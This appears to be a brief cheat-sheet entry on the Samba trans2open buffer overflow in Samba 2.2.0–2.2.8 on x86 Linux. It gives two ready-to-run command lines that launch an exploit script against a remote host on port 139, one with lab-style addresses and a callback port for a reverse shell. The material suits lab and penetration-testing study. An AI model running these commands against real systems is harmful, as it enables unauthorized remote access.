# Samba trans2open Overflow (Linux x86)

This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the noexec stack option set. NOTE: Some older versions of RedHat do not seem to be vulnerable since they apparently do not allow anonymous access to IPC.

```sh
./samba_2_2_x.pl -M B -t linx86 -H <LHOST> -h <RHOST> -p 139
./samba_2_2_x.pl -M B -t linx86 -H 10.11.0.xxx -h 10.11.1.xxx -p 139 -P 4444
```
